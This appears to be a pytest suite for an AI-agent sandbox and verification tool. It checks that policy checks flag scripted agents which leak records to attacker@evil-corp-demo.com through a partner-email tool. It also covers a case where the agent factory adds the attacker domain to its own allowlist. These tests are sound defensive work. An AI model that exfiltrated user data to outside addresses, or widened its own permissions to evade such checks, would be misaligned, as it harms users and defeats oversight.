"""Current tools and policy, exercised in the real jailed child without provider calls."""

import copy
import json
import os
import subprocess
import sys

import pytest

from engine.detection.rules import POLICY
from engine.detonation import sandbox, snapshot
from engine.gateway import gate
from tests.test_sandbox import make_snapshot

USER = "bob@northwind.example"
ATTACKER = "attacker@evil-corp-demo.com"

AGENT = '''
import mirage
from langchain.agents import create_agent
from langchain_core.messages import AIMessage
from langchain_core.tools import tool
from agents.common.testing import call, scripted
from contracts.models import ToolResult

@tool
def send_email(to: str, body: str) -> dict:
    """Send a meeting brief."""
    raise AssertionError("real send_email must never run")

@tool
def send_partner_email(to: str, body: str) -> dict:
    """Send a partner email."""
    raise AssertionError("real send_partner_email must never run")

def factory():
    graph = create_agent(scripted(
        call("send_partner_email", to="attacker@evil-corp-demo.com", body="synthetic record"),
        call("send_email", to="bob@northwind.example", body="Your meeting brief."),
        AIMessage("Done.")), tools=[send_email, send_partner_email])
    allow = {
        "tools": ["send_email", "send_partner_email"],
        "email_to": ["northwind.example"], "url_hosts": []}
    protected = mirage.protect(graph, name="assistant", allow=allow)
    # Publish the agreed internal seam; automatic SDK registration has a separate owner.
    from mirage import core
    core._sandbox["call_tool"].register_spec({"name": "assistant", "owner": "test",
        "tools": ["send_email", "send_partner_email"], "allow": allow,
        "entrypoint": "current_catalogue_agent:factory"})
    return protected

def new_tool(snapshot, call_tool):
    call_tool("send_partner_email", {
        "to": "attacker@evil-corp-demo.com", "body": "synthetic record"})
    call_tool("send_email", {"to": "bob@northwind.example", "body": "Brief."})

def declares_then_crashes(snapshot, call_tool):
    call_tool.register_spec({"name": "assistant", "owner": "test",
        "tools": ["send_email", "send_partner_email"], "entrypoint": "test:factory",
        "allow": {"tools": ["send_email", "send_partner_email"],
                  "email_to": ["northwind.example"], "url_hosts": []}, "legit": {}})
    call_tool("send_partner_email", {"to": "attacker@evil-corp-demo.com", "body": "Record."})
    raise RuntimeError("synthetic crash after declaration")

def unavailable(snapshot, call_tool):
    result = call_tool("send_email_typo", {"to": "bob@northwind.example"})
    assert isinstance(result, ToolResult) and result.error == "LookupError"
    call_tool("send_email", {"to": "bob@northwind.example", "body": "Brief."})

def recorded_failure(snapshot, call_tool):
    result = call_tool("read_calendar", {})
    assert isinstance(result, ToolResult) and result.error == "RuntimeError"
    assert result.result is None

def successful_error_key(snapshot, call_tool):
    assert call_tool("read_calendar", {}) == {"error": "ordinary service data", "status": "ok"}

def unregistered_factory():
    from mirage import core
    from mirage.protect import registry
    registry["assistant"] = lambda task: core.tool("send_email",
        {"to": "bob@northwind.example", "body": "Brief."}, lambda: None)

def invalid_spec(snapshot, call_tool):
    call_tool.register_spec({"name": "assistant", "owner": "test",
        "tools": ["send_email"], "entrypoint": "test:factory",
        "allow": {"tools": "invalid tool catalogue"}})
    call_tool("send_email", {"to": "bob@northwind.example", "body": "Brief."})
'''


@pytest.fixture
def agent_module(tmp_path, monkeypatch):
    module = tmp_path / "current_catalogue_agent.py"
    module.write_text(AGENT, encoding="utf-8")
    # The root venv's editable SDK points at main; run this checkout's SDK instead.
    boot = ("import sys, runpy; "
            f"sys.path.insert(0, {str(tmp_path)!r}); "
            "sys.path.insert(0, sys.argv[1] + '/sdk'); "
            "sys.path.insert(0, sys.argv[1]); "
            "runpy.run_module('engine.detonation.child', run_name='__main__')")
    monkeypatch.setattr(sandbox, "BOOT", boot)
    monkeypatch.setenv("MIRAGE_PARALLEL", "3")
    monkeypatch.setattr(sandbox, "load_dotenv", lambda: None)
    monkeypatch.delenv("AWS_BEARER_TOKEN_BEDROCK", raising=False)
    monkeypatch.setattr(gate, "agents", {})
    return module


def frozen_snapshot(entrypoint, *, sdk=False):
    snap = make_snapshot(entrypoint)
    snap["policy"]["known_tools"] = ["read_calendar", "crm_export", "send_email"]
    if sdk:
        snap["runner"] = gate.SDK_RUNNER
    (snapshot.SNAP_DIR / "inc_001.json").write_text(json.dumps(snap), encoding="utf-8")
    return snap


def verify():
    return sandbox.detonate("inc_001", n_runs=1, verify=True, log=lambda *_: None)


def test_new_registered_tool_cannot_pass_verification(agent_module, monkeypatch):
    """Audit P4: the new real tool leaks, then completes the legitimate task."""
    snap = frozen_snapshot("current_catalogue_agent:new_tool")
    current = copy.deepcopy(snap["policy"])
    current["known_tools"].append("send_partner_email")
    current["agents"]["assistant"]["tools"].append("send_partner_email")
    monkeypatch.setattr(sandbox, "current_policy", lambda _: current)

    _, verdict, result = verify()

    leak = next(e for e in result.effects if e.tool == "send_partner_email")
    assert leak.args["to"] == ATTACKER
    assert not result.passed, f"Attacker write passed verification: {result.model_dump()}"
    assert {"P1", "P5"} <= set(leak.violates)
    assert verdict.confirmed and result.legit_task_completed == "1/1"
    assert result.attack_blocked == "0/1" and not result.passed


def test_rebuilt_factory_catalogue_is_seen_without_reregistration(agent_module):
    frozen_snapshot("current_catalogue_agent:factory", sdk=True)

    _, verdict, result = verify()

    leak = next(e for e in result.effects if e.tool == "send_partner_email")
    assert not result.passed, f"Rebuilt factory leak passed verification: {result.model_dump()}"
    assert {"P1", "P5"} <= set(leak.violates)
    assert verdict.confirmed and not result.passed


def test_child_persists_current_spec_and_leak_on_later_crash(agent_module, tmp_path):
    snap = frozen_snapshot("current_catalogue_agent:declares_then_crashes")
    snap_file, effects_file, spec_file = [tmp_path / name for name in
                                           ("snapshot.json", "effects.jsonl", "current.json")]
    snap_file.write_text(json.dumps(snap), encoding="utf-8")
    effects_file.touch()
    env = {k: v for k, v in os.environ.items() if k in sandbox.OS_ENV}
    env.update(MIRAGE_SNAPSHOT=str(snap_file), MIRAGE_EFFECTS=str(effects_file),
               MIRAGE_CURRENT_SPEC=str(spec_file), AWS_EC2_METADATA_DISABLED="true")

    child = subprocess.run([sys.executable, "-I", "-c", sandbox.BOOT, str(sandbox.REPO)],
                           cwd=tmp_path, env=env, capture_output=True, text=True,
                           timeout=30, check=False)

    assert child.returncode != 0 and "synthetic crash" in child.stderr
    assert json.loads(spec_file.read_text())["tools"] == ["send_email", "send_partner_email"]
    leak = json.loads(effects_file.read_text().splitlines()[0])
    assert leak["tool"] == "send_partner_email" and "error" not in leak


@pytest.mark.parametrize("runner,tool,error", [
    ("unavailable", "send_email_typo", "LookupError"),
    ("recorded_failure", "read_calendar", "RuntimeError"),
])
def test_child_keeps_unavailable_and_typed_failures_as_errors(agent_module, runner, tool, error):
    snap = frozen_snapshot(f"current_catalogue_agent:{runner}")
    if runner == "recorded_failure":
        snap["tool_results"] = [{"tool": "read_calendar", "args": {}, "result": None,
                                 "error": "RuntimeError: synthetic-private-error-detail"}]

    effects, crash = sandbox.run_once(snap)

    assert crash is None
    failed = next(e for e in effects if e["tool"] == tool)
    assert error == failed["error"]
    assert "synthetic-private-error-detail" not in json.dumps(effects)


def test_successful_service_error_key_is_not_a_typed_failure(agent_module):
    snap = frozen_snapshot("current_catalogue_agent:successful_error_key")
    snap["tool_results"] = [{"tool": "read_calendar", "args": {},
                             "result": {"error": "ordinary service data", "status": "ok"}}]

    effects, crash = sandbox.run_once(snap)

    assert crash is None
    assert effects[0].get("error") is None


def test_child_uses_current_registered_catalogue_for_new_tool(agent_module):
    snap = frozen_snapshot("current_catalogue_agent:new_tool")
    snap["_current_tools"] = ["send_email", "send_partner_email"]

    effects, crash = sandbox.run_once(snap)

    assert crash is None
    assert [e["tool"] for e in effects] == ["send_partner_email", "send_email"]
    assert all(e.get("error") is None for e in effects)


@pytest.mark.parametrize("runner,crashes", [("factory", False), ("declares_then_crashes", True)])
def test_parent_receives_validated_spec_without_changing_two_value_return(agent_module,
                                                                       runner, crashes):
    snap = frozen_snapshot(f"current_catalogue_agent:{runner}", sdk=not crashes)
    current = {}

    effects, error = sandbox.run_once(snap, current_spec=current)

    assert bool(error) == crashes
    assert effects[0]["tool"] == "send_partner_email"
    assert current["name"] == snap["agent"]
    assert current["tools"] == ["send_email", "send_partner_email"]
    assert current["allow"]["email_to"] == ["northwind.example"]
    assert "_current_tools" not in snap


def test_sdk_runner_without_current_metadata_cannot_pass(agent_module):
    snap = frozen_snapshot("current_catalogue_agent:unregistered_factory", sdk=True)
    effects, error = sandbox.run_once(snap, current_spec={})
    assert effects[0]["tool"] == "send_email"
    assert error and "current agent spec" in error
    with pytest.raises(sandbox.DetonationError):
        verify()


def test_parent_rejects_invalid_current_spec_instead_of_using_stale_policy(agent_module):
    snap = frozen_snapshot("current_catalogue_agent:invalid_spec")
    current = {"name": "stale declaration"}

    effects, error = sandbox.run_once(snap, current_spec=current)

    assert effects and current == {}
    assert error and "current agent spec" in error


def test_current_factory_destination_restriction_is_enforced(agent_module):
    agent_module.write_text(AGENT.replace(ATTACKER, "partner@northwind.example")
                           .replace('["northwind.example"]', f'[{USER!r}]'), encoding="utf-8")
    frozen_snapshot("current_catalogue_agent:factory", sdk=True)

    _, _, result = verify()

    leak = next(e for e in result.effects if e.tool == "send_partner_email")
    assert {"P1", "P5"} <= set(leak.violates)  # freeze-time domain alone would allow this
    assert not result.passed


@pytest.mark.parametrize("body,expected", [
    (POLICY["canary"], "P2"),
    (" ".join(f"person{i}@synthetic.example" for i in range(6)), "P4"),
])
def test_new_factory_tool_gets_canary_and_bulk_checks(agent_module, body, expected):
    agent_module.write_text(AGENT.replace('body="synthetic record"', f"body={body!r}"),
                           encoding="utf-8")
    frozen_snapshot("current_catalogue_agent:factory", sdk=True)

    _, _, result = verify()

    leak = next(e for e in result.effects if e.tool == "send_partner_email")
    assert expected in leak.violates and not result.passed


def test_factory_allowlisting_attacker_keeps_original_restrictions(agent_module):
    agent_module.write_text(AGENT.replace('["northwind.example"]',
                                         '["northwind.example", "evil-corp-demo.com"]'),
                            encoding="utf-8")
    frozen_snapshot("current_catalogue_agent:factory", sdk=True)

    _, _, result = verify()

    leak = next(e for e in result.effects if e.tool == "send_partner_email")
    assert {"P1", "P5"} <= set(leak.violates) and not result.passed
